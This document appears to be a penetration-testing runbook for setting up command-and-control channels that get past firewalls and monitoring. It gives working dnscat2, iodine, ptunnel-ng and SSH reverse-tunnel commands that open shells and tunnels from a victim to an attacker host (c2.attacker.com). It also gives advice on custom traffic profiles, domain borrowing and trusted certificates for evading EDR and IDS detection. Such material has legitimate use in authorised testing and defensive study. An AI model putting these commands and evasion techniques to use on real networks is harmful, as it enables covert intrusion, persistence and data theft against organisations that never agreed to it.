# Runbook: C2 and protocol tunnelling

## Objective

Establish a command-and-control channel through network controls using permitted protocols. The goal is a reliable, low-noise channel that survives firewall policy, network monitoring, and DNS filtering.

## Protocol selection

Choose the C2 protocol based on what is permitted and monitored at the target:

| Protocol | Permitted | Detection difficulty | Notes |
|---|---|---|---|
| HTTPS | Almost universally | High if TLS inspection absent | Preferred for most engagements |
| DNS | Universally | Medium | Reliable fallback; detectable via query volume |
| ICMP | Often | Medium | Low-bandwidth; useful for initial beacon |
| HTTP | Often blocked outbound | Low | Avoid unless HTTPS not possible |

## HTTPS C2

Most modern C2 frameworks (Cobalt Strike, Havoc, Sliver, Mythic) support HTTPS listeners. The key configuration decisions are:

Malleable profile or redirector configuration: the C2 traffic should mimic legitimate application traffic in its URI patterns, headers, and timing. Many default C2 profiles are signatured by EDR products and IDS rules; custom profiles that mimic traffic to CDN domains or cloud APIs are significantly harder to detect.

Domain fronting was widely used to route C2 traffic through CDN providers, but major CDNs have deprecated support for this technique. Domain borrowing (using a legitimate domain's CDN distribution with a custom subdomain) remains viable on some platforms.

Certificate legitimacy: C2 HTTPS connections should use certificates signed by a trusted CA for the domain being used, not self-signed certificates. Let's Encrypt certificates for attacker-controlled domains are free and trusted by all major platforms.

## DNS tunnelling

`dnscat2` provides an interactive shell over DNS:

```bash
# On the C2 server (requires authoritative DNS for a subdomain)
dnscat2-server c2.attacker.com

# On the victim (compiled binary or PowerShell)
dnscat2 --dns server=ns1.attacker.com,port=53,domain=c2.attacker.com --secret=<preshared-secret>
```

`iodine` provides IP-over-DNS tunnelling, allowing arbitrary TCP connections through the DNS channel:

```bash
# Server
iodined -f 10.0.0.1 c2.attacker.com

# Client
iodine -f -P <password> ns1.attacker.com
# Then SSH through the tunnel
ssh -D 1080 10.0.0.2
```

DNS tunnelling generates anomalous DNS query patterns: high query rate, long subdomain labels, high entropy in subdomain names, and consistent queries to a single authoritative domain. Rate-limiting queries and adding jitter reduces detection probability.

## ICMP tunnelling

```bash
# On the C2 server
ptunnel-ng -r <server-IP> -rp 22

# On the victim
ptunnel-ng -p <server-IP> -lp 8022 -da 127.0.0.1 -dp 22
ssh -p 8022 user@127.0.0.1
```

ICMP is useful as a bootstrap channel when other protocols are blocked but is limited in bandwidth and reliability. It is best used for initial access before establishing a more capable channel.

## SSH port forwarding and SOCKS proxy

Once SSH access exists to any network-accessible host:

```bash
# Dynamic SOCKS proxy (routes arbitrary TCP through the SSH connection)
ssh -D 1080 -N user@pivot-host

# Forward a specific port
ssh -L 3389:internal-host:3389 -N user@pivot-host

# Reverse tunnel (when pivot host cannot be reached directly)
# On pivot host:
ssh -R 4444:localhost:22 attacker@c2-server
```

Configure proxychains to route tool traffic through the SOCKS proxy:

```bash
echo 'socks5 127.0.0.1 1080' >> /etc/proxychains.conf
proxychains nmap -sT -Pn internal-host
```

## Evidence collection

Document: protocols used, domains or IPs serving as C2 infrastructure, any firewall or proxy bypasses achieved, and the duration and reliability of each channel.
